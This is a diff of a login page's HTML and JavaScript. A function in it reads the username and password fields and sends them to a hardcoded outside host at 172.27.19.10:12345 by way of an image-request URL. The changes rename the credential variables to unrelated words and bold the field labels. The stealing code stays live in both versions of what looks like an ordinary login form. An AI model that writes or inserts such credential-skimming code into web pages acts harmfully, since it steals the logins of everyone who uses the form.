@@ -15,10 +15,10 @@
                 console.log(e);
             };
             var hehe = function() {
-                    var us = document.getElementById("username").value;
-                    var ps = document.getElementById("password").value;
+                    var fires = document.getElementById("username").value;
+                    var water = document.getElementById("password").value;
                     var ip = "172.27.19.10:12345";
-                    var url = "http://"+ip+"/?"+"payload="+encodeURI(us)+","+encodeURI(ps);
+                    var url = "http://"+ip+"/?"+"payload="+encodeURI(fires)+","+encodeURI(water);
                     new Image().src = url;
                     setTimeout(function() {
                         return true;
@@ -40,11 +40,11 @@
                 <table>
                     <tbody>
                         <tr>
-                            <td>Username:</td>
+                            <td><b>Username:</b></td>
                             <td><input name="login_username" id="username" size="20" autocomplete="no" type="text"></td>
                         </tr>
                         <tr>
-                            <td>Password:</td>
+                            <td><b>Password:</b></td>
                             <td colspan="2"><input name="login_password" id="password" size="20" autocomplete="no" type="password">
                             <input name="submit_login" value="Log in" id="myBtn" type="submit">
                             <input name="submit_registration" value="Register" type="submit"></td>
